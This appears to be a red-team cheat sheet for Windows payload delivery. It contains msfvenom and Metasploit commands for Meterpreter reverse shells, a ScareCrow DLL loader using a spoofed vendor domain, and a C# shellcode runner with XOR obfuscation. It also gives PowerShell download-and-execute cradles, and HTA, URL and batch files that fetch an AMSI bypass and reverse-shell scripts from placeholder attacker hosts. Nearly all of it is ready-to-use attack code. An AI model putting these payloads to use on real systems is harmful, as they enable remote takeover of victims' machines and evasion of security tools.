## Scarecrow dll
#### Generate shellcode
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -i 11 -f raw -o hackerman.bin
```

#### Run with scarecrow
```
ScareCrow -Loader dll -domain trendmicro.com -I shellcode.bin
```

#### Start listener
```
sudo msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j -z'
```

#### Run payload
```
regsvr32.exe C:\Windows\Tasks\urlmon.dll
```

## Extra Xorred meterpreter DLL
- https://crypt0jan.medium.com/red-team-tutorials-4-616c565ccec9

#### Generate payload
- Save the payload size (byts). You need it later
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 --encoder x64/xor_dynamic -i 11 -f csharp > shellcode.txt
```

#### Xor payload
- https://github.com/crypt0jan/XORencoder
- ```git clone https://github.com/crypt0jan/XORencoder```
- Open the project in Visual Studio.
- Edit file ```Project.cs```, replacing the buf with your payload from Step 1
- At the top change Debug to Release and click Build XOR_encoder.
- Open the project directory ```\XORencoder\bin\Release\netcoreapp3.1\``` and run ```.\XOR_encoder.exe```
- Copy the new shellcode

#### Creating C# DLL
- Git clone https://github.com/crypt0jan/ClassLibrary1
- Paste the code from below over the code in ```Class1.cs```, to change some names.
- Edit line 39 and add the amount of bytes ```byte[] buf = new byte[1072]```
- Add the xorred shellcode.
- At the top change Debug to Release and click "Start"
- You will get an error popup but the build should succeed!

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace RunMe
{
    public class RunMeClass
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void RunBaby()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[1072]
                {  };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

```

#### Create a download and execute cradle
- Download the ```ClassLibrary1.dll``` file to your webserver.
- Create a ```runme.ps1``` file with the following content:
```
$data = (New-Object System.Net.WebClient).DownloadData('http://<IP>/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("RunMe.RunMeClass")
$method = $class.GetMethod("RunBaby")
$method.Invoke(0, $null)
```

#### Start listener
```
sudo msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j -z'
```

#### Download and execute cradle PowerShell:
```
powershell.exe -nop -w hidden -C "IEX (New-Object System.Net.WebClient).downloadString('http://<IP>/runme.ps1')"
```

## HTA files
```
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://<IP>/amsi.txt'))""; ""IEX ((new-object net.webclient).downloadstring('http://<IP>/HTTPStager.ps1'))"""
    End Function

    Pwn
  </script>
</html>
```

## URL file
```
C:\Windows\System32\cmd.exe /c powershell IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/amsi.txt')); IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/Invoke-PowerShellTcp2.ps1'))
```

## Bat file
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/amsi.txt')); IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/Invoke-PowerShellTcp2.ps1'))"

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/amsi.txt')); IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/Invoke-PowerShellTcp2.ps1'))"
```

## bat2exe
- https://github.com/islamadel/bat2exe/releases/tag/2.0

